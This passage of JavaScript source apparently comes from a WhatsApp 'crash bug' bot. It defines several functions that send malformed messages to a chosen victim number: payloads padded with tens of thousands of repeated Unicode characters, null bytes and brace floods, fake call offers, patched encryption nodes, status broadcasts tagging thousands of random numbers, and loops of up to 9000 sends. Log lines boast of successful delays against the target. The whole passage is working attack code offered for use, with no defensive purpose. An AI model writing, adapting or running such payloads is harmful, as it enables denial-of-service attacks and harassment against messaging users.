    "directPath": "/v/t62.7119-24/577313004_1396042095336744_3502303966329446087_n.enc?ccb=11-4&oh=01_Q5Aa3gEgeQo-cEIvQ4k8hdG8jL1_wM5a5Gu5LU_noz7DD_7vkQ&oe=699D4EA0&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1769337798",
    "caption": "🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666" + "𑇂𑆵𑆴𑆿".repeat(60000),
    "contextInfo": {
      "participant": "13135559098@s.whatsapp.net",
      "externalAdReply": {
        "automatedGreetingMessageShown": true,
        "automatedGreetingMessageCtaType": "\u0000".repeat(100000),
        "greetingMessageBody": "\u0000"
      }
    }
  }
}), { userJid: cx });

  await sock.relayMessage(cx, msg.message, {
    participant: { jid: cx },
    messageId: msg.key.id
  });
}

async function TsxDex(target) { 
    const msg = generateWAMessageFromContent(
      target,
      {
        ephemeralMessage: {
          message: {
            sendPaymentMessage: {
              noteMessage: {
                extendedTextMessage: {
                  text: "By : V-Arven Pro!!",
                  matchedText: "https://t.me/Bayysenpay",
                  description: "!.",
                  title: "",
                  paymentLinkMetadata: {
                    button: { displayText: "\x30" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(70000) }
                  }
                }
              }
            }
          }
        }
      },
      {}
    )

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      { messageId: null, participant: { jid: target } }
    )
}

async function albuminvs(target) {
  await sock.relayMessage(
    target,
    {
      albumMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          ),
          remoteJid: " ¡!deadcodex!¡ ",
          parentGroupJid: "0@g.us",
          isQuestion: true,
          isSampled: true,
          parentGroupJid: "\u0000",
          entryPointConversionDelaySeconds: 6767676767,
          businessMessageForwardInfo: null,
          botMessageSharingInfo: {
            botEntryPointOrigin: {
              origins: "BOT_MESSAGE_ORIGIN_TYPE_AI_INITIATED"
            },
            forwardScore: 999
          },
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "@xrelly • #fvcker 🩸",
                    format: "EXTENSIONS_1",
                  },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\u0000".repeat(1000000),
                    version: 1,
                  },
                },
              },
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    }
  );
}

async function croserds(sock, target) {
  if (!global.__flyingLimit) global.__flyingLimit = {};
  if (!global.__flyingMutex) global.__flyingMutex = Promise.resolve();

  const delay = ms => new Promise(r => setTimeout(r, ms));

  global.__flyingMutex = global.__flyingMutex.then(async () => {
    let last = global.__flyingLimit[target] || 0;
    let now = Date.now();
    let wait = last + (1000 + Math.random() * 500) - now;
    if (wait > 0) await delay(wait);
    global.__flyingLimit[target] = Date.now();
  });

  await global.__flyingMutex;

  let devices = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

  await sock.assertSessions(devices);

  let xnxx = () => {
    let map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => {
          try { await prev; } catch {}
          return fn();
        })(map[key].task);
        return map[key].task;
      }
    };
  };

  let memek = xnxx();
  let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let yntkts = sock.encodeWAMessage?.bind(sock);

  sock.createParticipantNodes = async (recipientJids, message, extraAttrs) => {
    if (!recipientJids.length)
      return { nodes: [], shouldIncludeDeviceIdentity: false };

    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
    let arrayMsg = Array.isArray(patched)
      ? patched
      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    let shouldIncludeDeviceIdentity = false;

    let nodes = await Promise.all(
      arrayMsg.map(async ({ recipientJid: jid, message: msg }) => {
        let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));
        return memek.mutex(jid, async () => {
          let { type, ciphertext } =
            await sock.signalRepository.encryptMessage({
              jid,
              data: bytes
            });

          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

          return {
            tag: 'to',
            attrs: { jid },
            content: [{
              tag: 'enc',
              attrs: { v: '2', type, ...extraAttrs },
              content: ciphertext
            }]
          };
        });
      })
    );

    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };

  let { nodes: destinations, shouldIncludeDeviceIdentity } =
    await sock.createParticipantNodes(
      devices,
      { conversation: "y" },
      { count: '0' }
    );

  let callId = crypto.randomBytes(16)
    .toString("hex")
    .slice(0, 64)
    .toUpperCase();

  let callNode = {
    tag: "call",
    attrs: {
      to: target,
      id: sock.generateMessageTag(),
      from: sock.user.id
    },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": callId,
        "call-creator": sock.user.id
      },
      content: [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        { tag: "net", attrs: { medium: "3" } },
        {
          tag: "capability",
          attrs: { ver: "1" },
          content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
        },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },
        ...(shouldIncludeDeviceIdentity
          ? [{
              tag: "device-identity",
              attrs: {},
              content: encodeSignedDeviceIdentity(
                sock.authState.creds.account,
                true
              )
            }]
          : [])
      ]
    }]
  };

  await sock.sendNode(callNode);

  setTimeout(async () => {
    try {
      await sock.sendNode({
        tag: "call",
        attrs: {
          to: target,
          id: sock.generateMessageTag(),
          from: sock.user.id
        },
        content: [{
          tag: "terminate",
          attrs: {
            "call-id": callId,
            reason: "success"
          }
        }]
      });
    } catch {}
  }, 3000);
  try {
    for (let i = 0; i < 100; i++) {
      await sock.relayMessage(
        "status@broadcast",
        {
          groupStatusMessageV2: {
            message: {
              extendedTextMessage: {
                text: "Xata" + "𑇂𑆵𑆴𑆿".repeat(40000)
              }
            }
          }
        },
        {
          statusJidList: [target],
          additionalNodes: [{
            tag: "meta",
            attrs: { status_setting: "allowlist" },
            content: [{
              tag: "mentioned_users",
              attrs: {},
              content: [{
                tag: "to",
                attrs: { jid: target }
              }]
            }]
          }]
        }
      );
    }
  } catch {}
}

async function vfz(target) {
  await WaSocket.relayMessage(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/540088134_2387171995086564_7374737232099736764_n.enc?ccb=11-4&oh=01_Q5Aa3wHsB8VZwvNZZDAwprB9JUvHSPN-aK2xJ5e6pB8CT0rROA&oe=69C791C5&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "OnvYb+0Ss+wPFvD8Rl/17+YlXYDRifpw5f+jRE1Gsbg=",
      fileLength: 999999999999999,
      seconds: 999999,
      mediaKey: "RVY9RqvBDcgghvdeedlN5jTK3IsSLsFgqgkzej4e3X4=",
      caption: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️",
      height: 850,
      width: 478,
      fileEncSha256: "5zaKfVhEc73jJhA0A76c8pVmUlm2NnuVc3cnWce7RQc=",
      directPath: "/v/t62.7161-24/540088134_2387171995086564_7374737232099736764_n.enc?ccb=11-4&oh=01_Q5Aa3wHsB8VZwvNZZDAwprB9JUvHSPN-aK2xJ5e6pB8CT0rROA&oe=69C791C5&_nc_sid=5e03e0&_nc_hot=1772095746",
      mediaKeyTimestamp: "1772015271",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAtAAADAQEBAAAAAAAAAAAAAAAAAwQCAQUBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA8xd08q1UTizoenMSK1a9WaMkNT3ZrFyc7nOmsY2rtlXZWZ3ooDzQNY6AaAP/xAAcEAADAAMBAQEAAAAAAAAAAAAAAQIDEBESEyD/2gAIAQEAAT8AyRwlDRS1lnp54UU9XRVlWd1ksqt9MjEunyfDyeRvpjJ5wySN6TJsp+j5tnToqFZjufyqaP/EABkRAAIDAQAAAAAAAAAAAAAAAAEQABEgAv/aAAgBAgEBPwBjA6dSzj//xAAaEQACAgMAAAAAAAAAAAAAAAABAhAgABEh/9oACAEDAQE/AJNCvJDZqn//2Q==",
      processedVideos: [{
        quality: "HIGH",
        capabilities: ["7eppeliTcore","XzoneCatalyst","PDFsCorp"]
      }],
      gifAttribution: "GIPHY",
      contextInfo: {
        forwardingScore: 7205,
        isForwarded: true,
        pairedMediaType: "HEVC_VIDEO_CHILD",
        forwardOrigin: "UNKNOWN"
      },
      streamingSidecar: "fAMcYnkzkWykVy5Nr51RhzHwBRVBfXHYi5aR/XpP7X8b50/aNLQOKn6Q2Md1FSI0LOk2QW8sfmBSUdpYoPBeOhPFCeWjIKvK6pt7M5eEhKZYk2laDw3jpHKsW0fhQKTsluCFHJQr6oamjFtRs3MybkhXOMEm9osjbq83MBKgR+DqWqGGvic/xVFX5TvHX7saOSY5iCGVeJXlLU/ZZfxQkZO5zx7F3WVY6Y0oXI7bvz/YyT2hPYXRyKhp6SAgm9El6BvkLeYflYV3tlyzly+uMwJJq2nDUWBJYEc0ARR3F4WqpZnpjQJKTtwXl8sC4yHBS2hQFT1sLighApXV1mYEUNJFL9vNMu+9hvv6Irmd/+E4oAXnKB8mpy1scoBigBKlJYX7PrK58SUbN+qj/+WgwaZGVNeMpED2fR9wR8t5TuvXPJgnnEpwfCas",
      annotations: [
        {
          polygonVertices: [
            {
              x: 0.25,
              y: 0.4155234396457672
            },
            {
              x: 0.75,
              y: 0.4155234396457672
            },
            {
              x: 0.75,
              y: 0.5836874842643738
            },
            {
              x: 0.25,
              y: 0.5836874842643738
            }
          ],
          shouldSkipConfirmation: true,
          embeddedContent: {
            embeddedMusic: {
              musicContentMediaId: "806119065866333",
              songId: "1137812656623908",
              author: "͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊".repeat(2000),
              title: "͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊͊".repeat(2000),
              artworkDirectPath: "/v/t61.89441-24/595437186_731840673341902_1266462731933211674_n.enc?ccb=11-4&oh=01_Q5Aa3wGVOUtWMjbELz41CC6Hq7KB65m4UQ1Ok_J4Onvo7RgRZQ&oe=69C77E6D&_nc_sid=5e03e0",
              artworkSha256: "r9BWAOUfrDCnp3bn+/bzOx1A966Z3CSpnemr24FtaV0=",
              artworkEncSha256: "r9BWAOUfrDCnp3bn+/bzOx1A966Z3CSpnemr24FtaV0=",
              artistAttribution: "https://t.me/ZeppeliPdf",
              countryBlocklist: "UlU=",
              isExplicit: true,
              artworkMediaKey: "",
              musicSongStartTimeInMs: "7000",
              derivedContentStartTimeInMs: "0",
              overlapDurationInMs: "30000"
            }
          },
          embeddedAction: true
        }
      ],
      metadataUrl: "https://mmg.whatsapp.net/channel/video?id=921729444087793"
    }
  }, {
    participant: { jid:target }
  })
}

async function hardblankkelra(sock, target) {
  const KuNtoL = 'ꦾ'.repeat(11000);
  const Baster = 'ꦿꦸ'.repeat(10000);
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              quotedMessage: {
                callLogMesssage: {
                  isVideo: false,
                  callOutcome: "ONGOING",
                  durationSecs: "0",
                  callType: "VOICE_CHAT",
                  participants: [
                    {
                      jid: "13135550002@s.whatsapp.net",
                      callOutcome: "CONNECTED"
                    },
                    ...Array.from({ length: 10000 }, () => ({
                      jid: `1${Math.floor(Math.random() * 99999)}@s.whatsapp.net`,
                      callOutcome: "CONNECTED"
                    }))
                  ]
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            header: {
              videoMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "pctPKf/IwXKoCzQ7da4YrzWk+K9kaySQuWqfbA8h0FY=",
                fileLength: "847271",
                seconds: 7,
                mediaKey: "dA+Eu1vaexH4OIHRZbL8uZIND+CKA6ykw9B2OrL+DH4=",
                gifPlayback: true,
                height: 1280,
                width: 576,
                fileEncSha256: "GwTECHj+asNIHYh/L6NAX+92ob/LDSP5jgx/icqHWvk=",
                directPath: "/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1752236759",
                jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q==", 'base64'),
                gifAttribution: "NONE"
              },
              hasMediaAttachment: false
            },
            body: {
              text: "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: ""
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    flow_action: "navigate",
                    flow_action_payload: { screen: "CTZ_SCREEN" },
                    flow_cta: "ꦾ".repeat(50000),
                    flow_id: "UNDEFINEDONTOP",
                    flow_message_version: "9.903",
                    flow_token: "UNDEFINEDONTOP"
                  })
                }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  await sock.relayMessage(
    target,
    {
      groupInviteMessage: {
        groupJid: "120363347113453659@g.us",
        inviteCode: "x",
        inviteExpiration: Date.now(),
        groupName: "؂ن؃؄ٽ؂ن؃".repeat(10000),
        caption:"ꦾ".repeat(50000),
        jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwE6De/A+AaXgmrtuspqs4ZlwFzfrqKsZY4OXccp+w5z2BGccwz482rGTp1OTqY2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q==", 'base64')
      }
    },
    {
      participant: { jid: target },
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    }
  );
  
  const msgNewsletter = {
    newsletterAdminInviteMessage: {
      newsletterJid: "1@newsletter",
      newsletterName: "💣⃟Boom‽" + "ោ៝".repeat(20000),
      caption: "💣⃟Boom‽" + Baster + "ោ៝".repeat(20000),
      inviteExpiration: "999999999",
    },
  };

  await sock.relayMessage(target, msgNewsletter, {
    participant: { jid: target },
    messageId: null,
  });

  const msg2 = await generateWAMessageFromContent(target, msgNewsletter, {});
  await sock.relayMessage("status@broadcast", msg2.message, {
    messageId: msg2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target } }]
          }
        ]
      }
    ]
  });

  const message2 = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 9999999999,
            seconds: 9999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 9999999999,
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(10000000 + Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            waveform: Buffer.from("AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==", 'base64')
          },
          interactiveMessage: {
            body: {
              text: "Hi I'm kelra!!" + "ꦾ".repeat(20000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "galaxy_custom",
                  buttonParamsJson: KuNtoL
                },
                {
                  name: "send_location",
                  buttonParamsJson: KuNtoL
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: KuNtoL
                },
                {
                  name: "review_order",
                  buttonParamsJson: KuNtoL
                },
                {
                  name: "catalog_message",
                  buttonParamsJson: KuNtoL
                }
              ]
            }
          }
        }
      }
    }
  };

  const msg1 = await generateWAMessageFromContent(target, message2.message, {
    userJid: sock.user?.id || target
  });

  await sock.relayMessage(target, msg1.message, {
    messageId: msg1.key.id
  });

  await new Promise(resolve => setTimeout(resolve, 250));
  
}

async function AyunBelovedxnxxahyaa(sock, target) {
    console.log(chalk.red('𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴'));

    const { nodes, shouldIncludeDevicelentity } = await sock.emit('getNodes');

    const message = {
        extendedTextMessage: {
            text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(50000) + "\n\nJust OTAX" + "\0".repeat(100),
            matchedText: "https://t.me/Otapengenkawin",
            description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
            title: "ꦽ".repeat(20000),
            previewType: 6,
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCAwYBBQEBAAAAAAAAAAAAAAAAAAAAA//aAAwDAQACEQMQAA+q6BooLAAFIkkgAJIsAAJEsAAJYACWC//9oACAEBAAEFAu7Z25Z9LiY3XbLs+d2s3R8/tYm7m0y7bLlyz25dV1ZYsuXKXLly9y5cuXL3Lly5cuXL3Lly5cuXL3Lly5f/EABYRAAMAAAAAAAAAAAAAAAAAAAEQYf/aAAgBAgEBPwFQz//EABYRAAMAAAAAAAAAAAAAAAAAAAEQUf/aAAgBAwEBPwEUz//Z",
            paymentLinkMetadata: {
                button: { displayText: "Love U My Ayun" },
                header: { headerType: 1 },
                provider: { paramsJson: "{".repeat(10000) }
            },
            contextInfo: {
                isForwarded: true,
                forwardingScore: 9999,
                participant: target,
                remoteJid: "status@broadcast",
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
                ],
                quotedMessage: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: "otax@newsletter",
                        newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
                        caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
                        inviteExpiration: "999999999"
                    }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
                    newsletterJid: "13135550002@newsletter",
                    serverId: 1
                }
            }
        }
    };

    const fullMsgNode = await sock.generateWAMessage(target, message, {
        userJid: sock.user.id
    });

    const encNode = fullMsgNode.content[0];

    const Stanza = {
    tag: "message",
    id: sock.generateMessageID(),
    type: "text",
    to: target,
    additionalAttributes: {},
    content: [
      {
        tag: "enc",
        attrs: {
          v: "2",
          type: "none"
        },
        content: []
      },
      {
        tag: "participants",
        atts: {},
        content: nodes
      }
    ]
  }

    await sock.sendNode(Stanza);

    await sleep(1000);

    await sock.sendMessage(target, {
        delete: {
            remoteJid: target,
            fromMe: true,
            id: fullMsgNode.attrs.id,
            participant: target
        }
    });

    console.log(chalk.bold.red("Delay Visib Success To " + target));
}

async function infinityforce(sock, target) {
   for(let i = 0; i < 9000; i++) {
        const msg = generateWAMessageFromContent(target, {
            ephemeralMessage: {
                message: {
                    imageMessage: {
